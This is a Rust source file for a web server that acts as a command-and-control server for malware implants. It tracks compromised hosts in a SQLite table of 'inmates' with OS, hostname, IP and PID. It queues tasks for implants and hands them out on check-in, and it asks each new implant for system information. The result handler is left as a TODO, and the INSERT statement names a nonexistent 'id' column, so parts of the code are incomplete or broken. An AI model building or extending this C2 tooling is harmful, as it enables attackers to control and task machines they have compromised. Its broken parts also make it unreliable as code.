extern crate Justice;
#[macro_use] extern crate rocket;
use rocket::serde::{Deserialize, Serialize, json::Json};
use rand::random;
use rocket::Response;
use rocket::Request;
use Justice::actions::c2_actions;
use Justice::CheckInResponse;
use Justice::PostRequest;
use Justice::Inmate;
use Justice::actions::{ResponseActionType, RequestActionType};
use rusqlite::{Connection, Result, params};
use std::time::SystemTime;



fn create_db() {
    let conn = Connection::open("prisoninmates.db");
    match conn {
        Ok(conn) => {
           match conn.execute(
                "CREATE TABLE IF NOT EXISTS inmates (
                    rowid INTEGER PRIMARY KEY,
                    os TEXT,
                    hostname TEXT,
                    ip TEXT,
                    pid INTEGER,
                    last_checkin INTEGER,
                    pending_instruct TEXT,
                    pending_instruct_type TEXT
                )",
                [],
            ) {
                Ok(_) => {
                    {}
                }
                Err(_) => {
                    panic!("Error creating table");
                }
            }
        },
        Err(_) => {
            panic!("Error creating database, make sure you can write a file to the current directory, or modify the path");
        }
    }
}

#[get("/")]
fn index() -> &'static str {
    "Hello, world!"
}

#[post("/c2/<implant_id>", data = "<c2_request>")]
fn handle_c2_request(implant_id: &str, c2_request: Json<PostRequest>) -> &'static str {
    /* TODO */
    return "ok";
}

#[get("/c2/<implant_id>")] 
fn get_c2_request(implant_id: String) -> Json<CheckInResponse> {
    
    let conn = Connection::open("prisoninmates.db").unwrap();
    let mut stmt = conn.prepare("SELECT * FROM inmates").unwrap();
    let mut inmate_iter = stmt.query_map([], |row| {
        let instr_type: String = row.get(7)?;
        Ok(Inmate {
            rowid: row.get(0)?,
            os: row.get(1)?,
            hostname: row.get(2)?,
            ip: row.get(3)?,
            pid: row.get(4)?,
            last_checkin: row.get(5)?,
            pending_instruct: row.get(6)?,
            pending_instruct_type: instr_type.parse::<c2_actions>().unwrap(),
        })
    }).unwrap();
    for inmate in inmate_iter {
        let inmate_unwrapped = inmate.unwrap();
        if inmate_unwrapped.rowid.to_string() == implant_id {
            let _ = conn.execute(
                "UPDATE inmates SET pending_instruct = ?1, pending_instruct_type = ?2 WHERE rowid = ?3",
                params!["", "wait", inmate_unwrapped.rowid]
            );
            return Json(CheckInResponse {
                task: inmate_unwrapped.pending_instruct_type,
                task_parameters: inmate_unwrapped.pending_instruct,
            });
        }
    }

    let _ = conn.execute(
        "INSERT INTO inmates (id, os, hostname, ip, pid, last_checkin, pending_instruct, pending_instruct_type) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
        params![implant_id, "Unknown", "Unknown", "TBD", 1234, SystemTime::now().duration_since(SystemTime::UNIX_EPOCH).unwrap().as_secs(), "", "Wait"]
    );
    return Json(CheckInResponse {
        task: c2_actions::SystemInfo,
        task_parameters: "".to_string(),
    });

}

#[launch]
fn rocket() -> _ {
    create_db();
    rocket::build()
        .mount("/", routes![index])
        .mount("/", routes![handle_c2_request])
        .mount("/", routes![get_c2_request])
}